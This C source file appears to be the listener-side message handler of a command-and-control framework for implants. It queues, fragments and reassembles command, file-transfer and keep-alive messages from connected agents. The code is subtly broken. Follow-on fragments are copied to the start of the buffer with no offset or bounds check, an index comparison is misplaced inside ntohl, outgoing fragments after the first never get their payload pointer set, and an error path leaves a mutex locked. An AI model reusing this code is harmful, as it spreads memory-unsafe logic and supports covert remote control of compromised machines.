/*
message_handler.c

This file is responsible for the following:
* fragmenting messages that are being sent out
* assembling fragmented messages from agents
* handling alive messages
* passing messages to and from console

*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <stdbool.h>
#include <signal.h>

#include <arpa/inet.h>

#include "utility.h"
#include "queue.h"
#include "implant.h"
#include "base.h"
#include "listener_handler.h"

// Globals
// Receive Queue
extern Queue* listener_receive_queue;
extern pthread_mutex_t listener_receive_queue_lock;
// Send Queue
extern Queue* listener_send_queue;
extern pthread_mutex_t listener_send_queue_lock;
// SIGINT flag
extern volatile sig_atomic_t all_sigint;
extern volatile sig_atomic_t shell_sigint;

STATIC int listener_parse_first_fragment(Connected_Agents* CA, Queue_Message* q_message){
	Fragment* fragment = q_message->fragment;

	debug_print("Got first command or file fragment: %d\n", ntohl(fragment->first_payload.total_size));
	// get payload size
	CA->agents[q_message->id].total_message_size = ntohl(fragment->first_payload.total_size);
	
	// set last fragment index
	CA->agents[q_message->id].last_fragment_index = 0;
	
	// allocate memory and null
	CA->agents[q_message->id].message = malloc(CA->agents[q_message->id].total_message_size + 1);
	memset(CA->agents[q_message->id].message, 0, CA->agents[q_message->id].total_message_size + 1);
	
	int this_payload_size = q_message->size - sizeof(fragment->type) - sizeof(fragment->index) - sizeof(fragment->first_payload.total_size);
	
	// copy payload (not including total message size) to message buffer
	memcpy(CA->agents[q_message->id].message, fragment->first_payload.actual_payload, this_payload_size);
	
	// record current size of message
	CA->agents[q_message->id].current_message_size = this_payload_size;
	debug_print("agents[q_message->id]->current_message_size: %d\n", CA->agents[q_message->id].current_message_size);
	return RET_OK;
}

STATIC int listener_parse_next_fragment(Connected_Agents* CA, Queue_Message* q_message){
	Fragment* fragment = q_message->fragment;

	int this_payload_size = q_message->size - sizeof(fragment->type) - sizeof(fragment->index);
	
	// copy payload to end of message buffer
	memcpy(CA->agents[q_message->id].message, fragment->next_payload, this_payload_size);
	
	// update current size of message
	CA->agents[q_message->id].current_message_size += this_payload_size;
	return RET_OK;
}

STATIC int listener_handle_complete_message(Agent* agent){
	int ret_val = RET_OK;
	
	// check if we received all fragments
	if (agent->last_fragment_index != -1 && agent->total_message_size == agent->current_message_size){
		printf("Do something with completed message:\n%s\n", agent->message);
		agent->last_fragment_index = -1;
		free(agent->message);
		agent->message = NULL;
	}

	return ret_val;
}

STATIC int handle_message(Connected_Agents* CA){
	Queue_Message* message;
	Fragment* fragment;

	if (!(message = dequeue(listener_receive_queue, &listener_receive_queue_lock))) return RET_OK;
	debug_print("taking message off queue: id: %d, size: %d\n", message->id, message->size);

	// check if socket file descriptor was removed from agents global variable
	pthread_mutex_lock(&CA->lock);
	if (!CA->agents[message->id].alive){
		pthread_mutex_unlock(&CA->lock);
		debug_print("%s\n", "agent was removed");
		return RET_OK;
	}
	
	fragment = message->fragment;
	// if type is alive packet, update keep alive parameter
	if (ntohl(fragment->type) == TYPE_ALIVE){
		debug_print("Agent %d is alive: %lu seconds\n", message->id, (unsigned long)ntohl(fragment->first_payload.alive_time));
		CA->agents[message->id].alive = (uint)time(NULL);
	}
	else if (ntohl(fragment->type) == TYPE_COMMAND || ntohl(fragment->type) == TYPE_PUT_FILE || ntohl(fragment->type) == TYPE_GET_FILE){
		if (CA->agents[message->id].last_fragment_index == -1 && ntohl(fragment->index == 0)){
			listener_parse_first_fragment(CA, message);
		}
		else if (ntohl(fragment->index) == CA->agents[message->id].last_fragment_index++){
			listener_parse_next_fragment(CA, message);
		}
		else{
			// We are out of order. Dump all collected packets and try again next time
			CA->agents[message->id].last_fragment_index = -1;
		}
		
		if (listener_handle_complete_message(&CA->agents[message->id]) != RET_OK){
			printf("ERROR agent_handle_complete_message\n");
			return RET_ERROR;
		}
	}
	
	pthread_mutex_unlock(&CA->lock);
	free(message->fragment);
	free(message);
	return RET_OK;
}

int listener_prepare_message(int sockfd, int type, char* message, int message_size){
	Queue_Message* q_message;
	Fragment* fragment;
	int bytes_sent = 0;
	int index = 0;
	
	// prepare first fragment with size in first 4 bytes
	fragment = malloc(sizeof(Fragment));
	memset(fragment, 0, sizeof(Fragment));
	fragment->type = htonl(type);
	fragment->index = htonl(index++);
	fragment->first_payload.total_size = htonl(message_size);
	
	bytes_sent = message_size < FIRST_PAYLOAD_SIZE ? message_size : FIRST_PAYLOAD_SIZE;
	memcpy(fragment->first_payload.actual_payload, message, bytes_sent);
	
	q_message = malloc(sizeof(Queue_Message));
	memset(q_message, 0, sizeof(Queue_Message));
	q_message->id = sockfd;
	q_message->size = sizeof(fragment->type) + sizeof(fragment->index) + sizeof(fragment->first_payload.total_size) + bytes_sent;
	q_message->fragment = fragment;

	enqueue(listener_send_queue, &listener_send_queue_lock, q_message);
	
	while (bytes_sent < message_size){
		fragment = malloc(sizeof(Fragment));
		memset(fragment, 0, sizeof(Fragment));
		fragment->type = htonl(type);
		fragment->index = htonl(index++);
		
		int num_fragment_bytes = (message_size - bytes_sent) < NEXT_PAYLOAD_SIZE ? (message_size - bytes_sent) : NEXT_PAYLOAD_SIZE;
		memcpy(fragment->next_payload, message + bytes_sent, num_fragment_bytes);
		
		q_message = malloc(sizeof(Queue_Message));
		memset(q_message, 0, sizeof(Queue_Message));
		q_message->id = sockfd;
		q_message->size = sizeof(fragment->type) + sizeof(fragment->index) + num_fragment_bytes;

		enqueue(listener_send_queue, &listener_send_queue_lock, q_message);
		
		bytes_sent += num_fragment_bytes;
	}
	
	free(message);
	return 0;
}

void *listener_handler_thread(void *vargp){
	Connected_Agents* CA = vargp;

	while(!all_sigint){
		if (handle_message(CA) != RET_OK){
			printf("listener_handler_thread error\n");
			all_sigint = true;
		}
	}

	debug_print("%s\n", "listener_handler_thread done");
	return 0;
}